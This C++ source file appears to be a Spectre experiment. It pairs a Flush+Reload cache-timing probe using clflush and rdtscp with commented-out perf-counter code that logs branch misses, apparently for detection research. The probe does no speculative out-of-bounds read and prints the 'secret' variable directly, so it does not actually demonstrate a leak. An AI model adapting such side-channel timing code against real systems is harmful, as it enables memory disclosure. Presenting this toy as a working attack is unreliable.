#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <cstdint>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <linux/types.h>
#include <fstream>
#include <x86intrin.h>
#include <emmintrin.h>

#define NUM_EVENTS 4
#define CACHE_HIT_THRESHOLD 80

//std::ofstream output("output.csv");
//int array_size = 10;
//int array[10] = {
//    0, 1, 2, 3, 4, 5, 6, 7, 8, 9
//};
//
//void victim_function(int x) {
//    if (x < array_size) {
//        int temp = array[x];
//    }
//}
//
//void observe_victim(int x) {
//    struct perf_event_attr pe[NUM_EVENTS];
//    int fd[NUM_EVENTS];
//    int count[NUM_EVENTS];
//
//    memset(&pe, 0, sizeof(struct perf_event_attr) * NUM_EVENTS);
//
//    pe[0].type = PERF_TYPE_HARDWARE;
//    pe[0].config = PERF_COUNT_HW_BRANCH_INSTRUCTIONS;
//    pe[1].type = PERF_TYPE_HARDWARE;
//    pe[1].config = PERF_COUNT_HW_BRANCH_MISSES;
//    //pe[2].type = PERF_TYPE_HARDWARE;
//    //pe[2].config = PERF_COUNT_HW_CACHE_REFERENCES;
//    //pe[3].type = PERF_TYPE_HARDWARE;
//    //pe[3].config = PERF_COUNT_HW_CACHE_MISSES;
//
//    // Create the performance counters
//    for (int i = 0; i < NUM_EVENTS; i++) {
//        fd[i] = syscall(__NR_perf_event_open, &pe[i], 0, -1, -1, 0);
//        if (fd[i] == -1) {
//            std::cout << "Error opening perf event: " << i << std::endl;
//            exit(EXIT_FAILURE);
//        }
//    }
//
//    // Start the performance counters
//    for (int i = 0; i < NUM_EVENTS; i++) {
//        ioctl(fd[i], PERF_EVENT_IOC_RESET, 0);
//        ioctl(fd[i], PERF_EVENT_IOC_ENABLE, 0);
//    }
//
//    // Spectre attack
//    victim_function(x);
//
//    // Stop the performance counters and read the counts
//    for (int i = 0; i < NUM_EVENTS; i++) {
//        ioctl(fd[i], PERF_EVENT_IOC_DISABLE, 0);
//        read(fd[i], &count[i], sizeof(uint64_t));
//        close(fd[i]);
//    }
//
//    // Print the results
//    output << x << ";" 
//           << count[0] << ";" 
//           << count[1] << ";" 
//           << (double)count[1] / count[0] << std::endl;
//}

unsigned char probe_array[256 * 4096];
unsigned char array[10] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J'};
unsigned char secret_value = 'A';

void victim_function(size_t x) {
    if (x < 10) {
        unsigned char val = array[x];
        _mm_clflush(&array[x]);
        probe_array[val * 4096] = 1;
    }
}

void attacker_function() {
    int i;
    unsigned long long time1, time2;
    volatile unsigned char *addr;
    volatile unsigned int junk = 0;
    unsigned char val;

    for (i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }

    victim_function(3);

    for (i = 0; i < 256; i++) {
        time1 = __rdtscp(&junk);
        addr = &probe_array[i * 4096];
        val = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("Probe array access at index %d is a cache hit.\n", i);
            printf("Secret value: %c\n", secret_value);
        }
    }
}

int main()
{
    attacker_function();
    return 0;

    //output << "Index;Branch instructions;Branch misses;Branch miss rate" << std::endl;
    //output << "Index;Branch instructions;Branch misses;Branch miss rate;Cache references;Cache misses;Cache miss rate" << std::endl;
    //for (int i = 0; i < 1000000; i++) {
    //    if (i % 25 == 0) {
    //        observe_victim(i % array_size + array_size);
    //    }
    //    else {
    //        observe_victim(i % array_size);
    //    }
    //}
    //output.flush();
    //output.close();
    //
    //system("python3 ./main.py");
    //
    //return 0;
}